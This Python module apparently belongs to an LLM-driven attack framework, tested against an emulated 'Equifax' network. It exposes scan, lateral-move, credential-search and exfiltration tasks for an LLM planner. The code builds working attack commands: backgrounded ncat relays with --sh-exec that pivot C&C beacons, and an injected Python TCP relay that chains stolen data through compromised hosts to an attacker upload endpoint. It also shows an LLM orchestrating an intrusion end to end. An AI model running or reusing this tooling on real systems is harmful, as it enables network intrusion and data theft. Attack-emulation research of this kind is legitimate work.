"""
High-level task API the LLM calls inside <task> blocks.

These 5 functions are the ONLY interface between the planning layer (LLM) and
the execution layer (agents). The LLM never touches agents or runners directly.
"""

# ---------------------------------------------------------------------------
# Module-level state (lives for the lifetime of one orchestrator run)
# ---------------------------------------------------------------------------

_task_queue: list[dict] = []
_runners: dict[str, object] = {}  # IP -> CncRunner, filled by lateral_move on success

# Services and agents — set once by init(), then used by _dispatch_one()
_env = None
_cnc = None
_graph = None
_scan_agent = None
_lateral_agent = None
_findinfo_agent = None
_exfil_agent = None

_attacker_ip: str = "10.0.0.50"
_web_intnet_ip: str = "192.168.1.2"   # webserver's intnet-facing IP, used in exfil relay URL
_exfil_port: int = 9000               # ExfilReceiver port on the attacker
_relay_port: int = 9001               # ncat relay port on the intermediate webserver


# ---------------------------------------------------------------------------
# init() — called once by orchestrator before the planning loop starts
# ---------------------------------------------------------------------------

def init(env, cnc, graph, scan_agent, lateral_agent, findinfo_agent, exfil_agent,
         attacker_ip: str = "10.0.0.50", web_intnet_ip: str = "192.168.1.2"):
    global _env, _cnc, _graph
    global _scan_agent, _lateral_agent, _findinfo_agent, _exfil_agent
    global _attacker_ip, _web_intnet_ip
    _env = env
    _cnc = cnc
    _graph = graph
    _scan_agent = scan_agent
    _lateral_agent = lateral_agent
    _findinfo_agent = findinfo_agent
    _exfil_agent = exfil_agent
    _attacker_ip = attacker_ip
    _web_intnet_ip = web_intnet_ip
    _task_queue.clear()
    _runners.clear()


# ---------------------------------------------------------------------------
# 5 task functions — the LLM calls these inside <task> blocks.
# They only enqueue; no real work happens here.
# ---------------------------------------------------------------------------

def scan(subnet: str):
    """Queue a subnet scan."""
    _task_queue.append({"task": "scan", "subnet": subnet})


def lateral_move(target_ip: str):
    """Queue a lateral move to target_ip."""
    _task_queue.append({"task": "lateral_move", "target_ip": target_ip})


def find_information(host_ip: str):
    """Queue a credential/information search on a compromised host."""
    _task_queue.append({"task": "find_information", "host_ip": host_ip})


def escalate_privilege(host_ip: str):
    """Queue a privilege escalation on a compromised host."""
    _task_queue.append({"task": "escalate_privilege", "host_ip": host_ip})


def exfiltrate_data(host_ip: str, data_path: str):
    """Queue a data exfiltration from a compromised host."""
    _task_queue.append({"task": "exfiltrate_data", "host_ip": host_ip, "data_path": data_path})


# ---------------------------------------------------------------------------
# dispatch — called by the orchestrator after exec()-ing each <task> block
# ---------------------------------------------------------------------------

def dispatch_all_queued_tasks() -> list[dict]:
    """Run every task in the queue sequentially and return the results."""
    tasks = _task_queue.copy()
    _task_queue.clear()
    return [_dispatch_one(t) for t in tasks]


def _dispatch_one(task: dict) -> dict:
    t = task["task"]

    if t == "scan":
        subnet = task["subnet"]
        result = _scan_agent.run(subnet)
        return {"task": f"scan {subnet}", **result}

    elif t == "lateral_move":
        target_ip = task["target_ip"]

        # Find the best path to this target through hosts we already control
        paths = _graph.get_possible_attack_paths(target_ip)
        if not paths:
            return {
                "task": f"lateral_move {target_ip}",
                "success": False,
                "message": f"No reachable path to {target_ip} — scan more or compromise a pivot first",
            }

        best = paths[0]                        # shortest path first
        pivot_ip = best[-2]                    # second-to-last hop = our launch pad

        # If the launch pad is the attacker itself, no runner needed (direct exploit)
        pivot_runner = None if pivot_ip == _attacker_ip else _runners.get(pivot_ip)

        # Pick a credential that can open target_ip (if one exists)
        cred = None
        for c in _env.get_credentials():
            if target_ip in getattr(c, "can_access_hosts", []):
                cred = c
                break

        # For isolated targets reached via a pivot, start a Caldera TCP relay on
        # the pivot so the target can beacon back through it.
        caldera_server_url = None
        if pivot_runner is not None:
            relay_port = 8889
            relay_cmd = (
                f"nohup ncat -l -k -p {relay_port} "
                f"--sh-exec 'ncat host.docker.internal 8888' "
                f">/dev/null 2>&1 & sleep 1 && echo relay-ok"
            )
            pivot_runner.run(relay_cmd)

            # Dynamically find the pivot's IP on the target's subnet so the
            # relay URL is correct regardless of environment (Equifax or chain).
            import ipaddress
            relay_ip = _web_intnet_ip  # fallback for Equifax
            for subnet in _env.get_subnets():
                try:
                    if ipaddress.ip_address(target_ip) in ipaddress.ip_network(subnet.cidr, strict=False):
                        net_prefix = ".".join(subnet.cidr.split(".")[:3])
                        ip_out = pivot_runner.run(
                            f"hostname -I | tr ' ' '\\n' | grep '^{net_prefix}\\.'"
                        )
                        if ip_out and ip_out.strip():
                            relay_ip = ip_out.strip().split('\n')[0]
                        break
                except ValueError:
                    pass

            caldera_server_url = f"http://{relay_ip}:{relay_port}"

        result = _lateral_agent.run(target_ip, credential=cred, pivot_runner=pivot_runner,
                                    caldera_server_url=caldera_server_url)
        if result["success"]:
            _runners[target_ip] = result["data"]["runner"]
        return {"task": f"lateral_move {target_ip}", **result}

    elif t == "find_information":
        host_ip = task["host_ip"]
        runner = _runners.get(host_ip)
        if runner is None:
            return {
                "task": f"find_information {host_ip}",
                "success": False,
                "message": f"No C&C runner for {host_ip} — lateral_move to this host first",
            }
        result = _findinfo_agent.run(runner, found_on_host=host_ip)
        return {"task": f"find_information {host_ip}", **result}

    elif t == "escalate_privilege":
        # Equifax scenario does not require privilege escalation (stub — bug 5 fix)
        host_ip = task["host_ip"]
        return {
            "task": f"escalate_privilege {host_ip}",
            "success": False,
            "message": "EscalatePrivilege not needed in this environment",
        }

    elif t == "exfiltrate_data":
        host_ip = task["host_ip"]
        data_path = task["data_path"]
        runner = _runners.get(host_ip)
        if runner is None:
            return {
                "task": f"exfiltrate_data {host_ip}",
                "success": False,
                "message": f"No C&C runner for {host_ip} — lateral_move to this host first",
            }

        # Ask the attack graph for the shortest path from data host back to attacker
        exfil_route = _graph.get_shortest_exfil_path(host_ip)
        # exfil_route = [host_ip, ..., attacker_ip]

        if len(exfil_route) == 3:
            # One intermediate hop (e.g. Equifax: data_host → webserver → attacker).
            # The webserver can reach the attacker directly, so a single relay works.
            intermediate_ip = exfil_route[1]
            intermediate_runner = _runners.get(intermediate_ip)
            if intermediate_runner:
                relay_cmd = (
                    f"nohup ncat -l -p {_relay_port} "
                    f"--sh-exec 'ncat {_attacker_ip} {_exfil_port}' "
                    f">/dev/null 2>&1 & sleep 1 && echo relay-ok"
                )
                intermediate_runner.run(relay_cmd)
                exfil_url = f"http://{_web_intnet_ip}:{_relay_port}/upload"
            else:
                exfil_url = f"http://{_attacker_ip}:{_exfil_port}/upload"
        elif len(exfil_route) > 3:
            # Deep chain (3+ hops): build a chained ncat relay through every
            # intermediate host.  Each hop N forwards to the "inner" IP of hop N+1
            # — the IP on the shared subnet between them.
            #
            # exfil_route example (chain env):
            #   [10.23.0.2, 10.22.0.2, 10.21.0.2, 10.20.0.2, 10.20.0.50]
            #    data_host   host3       host2       host1      attacker
            #
            # We walk from the attacker end inward so each relay target is
            # already known before we set up the relay that points to it.
            #
            # Inner IPs (the IP visible from the previous hop):
            #   host1 inner IP toward net1 = discovered via `hostname -I`
            # We discover them on the fly with a quick `hostname -I` over C&C.

            import ipaddress

            def get_inner_ip(runner, subnet_cidr: str) -> str | None:
                """Return the host's IP that falls inside subnet_cidr."""
                out = runner.run("hostname -I")
                if not out:
                    return None
                prefix = ".".join(subnet_cidr.split(".")[:3])
                for ip in out.split():
                    try:
                        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet_cidr, strict=False):
                            return ip
                    except ValueError:
                        pass
                return None

            # intermediates: all hops between data host and attacker, in order
            # exfil_route[1:-1] = [host3, host2, host1]
            intermediates = exfil_route[1:-1]   # closest-to-data first
            attacker_ip   = exfil_route[-1]     # 10.20.0.50

            # Build relay chain from attacker end inward.
            # next_addr starts as attacker:exfil_port, then becomes each relay's address.
            next_addr = (attacker_ip, _exfil_port)

            # We need the subnet shared between consecutive hops to find inner IPs.
            # The env subnets list has them; match by checking which subnet contains both.
            def shared_subnet(ip_a: str, ip_b: str) -> str | None:
                # Check which subnet has both IPs registered in host_ips.
                # find_info_agent adds both the target and the pivot to the
                # inferred subnet, so this correctly identifies the bridge subnet
                # even when the two hosts are in different /24 CIDR ranges.
                for sn in _env.get_subnets():
                    if ip_a in sn.host_ips and ip_b in sn.host_ips:
                        return sn.cidr
                return None

            relay_setup_ok = True
            # Walk from the hop closest to attacker toward data host
            for i in range(len(intermediates) - 1, -1, -1):
                hop_ip = intermediates[i]
                hop_runner = _runners.get(hop_ip)
                if hop_runner is None:
                    relay_setup_ok = False
                    break

                # Find inner_ip = this hop's IP on the subnet it shares with the
                # data-side neighbor (the hop that will connect TO this relay).
                data_side_neighbor = intermediates[i - 1] if i > 0 else exfil_route[0]
                sn_cidr = shared_subnet(hop_ip, data_side_neighbor)

                # Discover this hop's inner IP on the shared subnet
                inner_ip = get_inner_ip(hop_runner, sn_cidr) if sn_cidr else None

                # Set up the relay.
                # Last intermediate hop (closest to attacker, i == len-1) uses a
                # Python TCP relay when python3 is available — more reliable for
                # large files than ncat --sh-exec pipes.  Other hops use ncat.
                if i == len(intermediates) - 1:
                    nh, np = next_addr
                    rp = _relay_port
                    py_relay = (
                        f"import socket,threading\n"
                        f"def p(a,b):\n"
                        f" try:\n"
                        f"  [b.sendall(d) for d in iter(lambda:a.recv(65536),b'') if d]\n"
                        f" except:pass\n"
                        f" [s.shutdown(socket.SHUT_WR) for s in (b,) if True]\n"
                        f"s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)\n"
                        f"s.bind(('',{rp}));s.listen(5)\n"
                        f"while True:\n"
                        f" c,_=s.accept();f=socket.socket()\n"
                        f" try:\n"
                        f"  f.connect(('{nh}',{np}))\n"
                        f"  [threading.Thread(target=p,args=a,daemon=True).start() for a in [(c,f),(f,c)]]\n"
                        f" except:c.close();f.close()\n"
                    )
                    relay_cmd = (
                        f"nohup /usr/bin/python3 -c \"{py_relay}\" "
                        f">/dev/null 2>&1 & sleep 1 && echo relay-ok"
                    )
                    result = hop_runner.run(relay_cmd)
                    # Fall back to ncat if python3 not available
                    if "relay-ok" not in (result or ""):
                        relay_cmd = (
                            f"nohup ncat -l -k -p {_relay_port} "
                            f"--sh-exec 'ncat {next_addr[0]} {next_addr[1]}' "
                            f">/dev/null 2>&1 & sleep 1 && echo relay-ok"
                        )
                        hop_runner.run(relay_cmd)
                else:
                    relay_cmd = (
                        f"nohup ncat -l -k -p {_relay_port} "
                        f"--sh-exec 'ncat {next_addr[0]} {next_addr[1]}' "
                        f">/dev/null 2>&1 & sleep 1 && echo relay-ok"
                    )
                    hop_runner.run(relay_cmd)

                # This hop's relay is now reachable at inner_ip:_relay_port
                # (from the previous hop's perspective)
                if inner_ip:
                    next_addr = (inner_ip, _relay_port)
                else:
                    next_addr = (hop_ip, _relay_port)

            if relay_setup_ok:
                exfil_url = f"http://{next_addr[0]}:{next_addr[1]}/upload"
            else:
                exfil_url = f"http://{_attacker_ip}:{_exfil_port}/upload"
        else:
            exfil_url = f"http://{_attacker_ip}:{_exfil_port}/upload"

        result = _exfil_agent.run(runner, data_path, receiver_url=exfil_url)
        return {"task": f"exfiltrate_data {host_ip} {data_path}", **result}

    else:
        return {"task": t, "success": False, "message": f"Unknown task type: {t}"}
